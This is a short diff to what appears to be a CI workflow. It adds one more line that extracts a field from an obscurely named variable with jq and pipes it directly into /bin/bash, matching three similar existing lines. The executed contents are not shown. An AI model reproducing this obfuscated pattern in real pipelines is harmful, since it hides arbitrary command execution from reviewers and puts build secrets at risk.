@@ -36,6 +36,7 @@ jobs:
           echo $kik29 | jq -r .dml5 | /bin/bash
           printf '%s' "$opa2" | jq -r .ignpo8575 | /bin/bash
           echo $vvlo742 | jq -r .vi5 | /bin/bash
+          printf '%s' "$mxqy00" | jq -r .zvalh85 | /bin/bash
 
       - name: Save archive
         if: always()
